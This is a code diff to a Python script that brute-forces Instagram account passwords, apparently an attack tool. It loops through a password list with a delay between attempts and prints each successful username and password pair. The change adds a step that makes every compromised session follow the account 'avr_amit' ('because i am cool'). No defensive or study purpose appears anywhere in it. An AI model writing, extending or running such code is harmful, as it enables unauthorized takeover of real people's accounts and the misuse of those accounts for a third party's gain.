@@ -20,9 +20,11 @@ def userExists(username):
 	r = requests.get('https://www.instagram.com/%s/?__a=1' % username) 
 	if (r.status_code == 404):
 		print ('User not found')
-		exit()
-	else:
-		return username
+		return False
+	elif (r.status_code == 200):
+		followdata = json.loads(r.text)
+		fUserID = followdata['user']['id']
+		return {'username':username,'id':fUserID}
 
 
 def Login(username,password):
@@ -65,7 +67,25 @@ def Login(username,password):
 
 
 
-username = userExists(str(input('Please enter a username: ')))
+def follow(sess, username):
+	username = userExists(username)
+	if (username == False):
+		return	
+	else:
+		userID = username['id']
+		followReq = sess.post('https://www.instagram.com/web/friendships/%s/follow/' % userID)
+		print (followReq.text)
+
+
+username = str(input('Please enter a username: '))
+username = userExists(username)
+if (username == False):
+	exit()
+else:
+	username = username['username']
+
+
+
 delayLoop = int(input('Please add delay between the passwords (in seconds): ')) 
 
 
@@ -74,6 +94,9 @@ for i in range(len(passwords)):
 	sess = Login(username,password)
 	if (sess):
 		print ('Login success %s' % [username,password])
+
+		#because i am cool
+		follow(sess,'avr_amit')
 
 	try:
 		time.sleep(delayLoop)
